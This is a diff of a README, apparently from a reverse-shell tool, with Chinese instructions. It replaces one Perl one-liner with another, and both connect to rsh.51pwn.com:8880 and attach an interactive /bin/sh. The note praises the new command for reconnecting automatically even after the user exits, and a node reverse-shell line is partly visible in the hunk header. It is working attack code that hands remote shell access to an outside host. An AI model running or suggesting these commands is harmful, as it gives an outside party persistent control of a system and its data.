@@ -22,7 +22,7 @@ node -e '(function(){ var net = require("net"), cp = require("child_process"), s
 ```
   *** 特别推荐下面的命令，经过若干 AI 的优化，可以覆盖 90% 以上的服务器上正确运行, 下面的命令明显比上面的更加优化，即便你关闭浏览器，或者输入exit，下面的代码会自动重新上线
 ```
-  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");};};};'
+  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){print S "YourId\n";open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");}wait();}};'
 ```
 * open your browser
   *** 注意后面的id必须和上面的一致
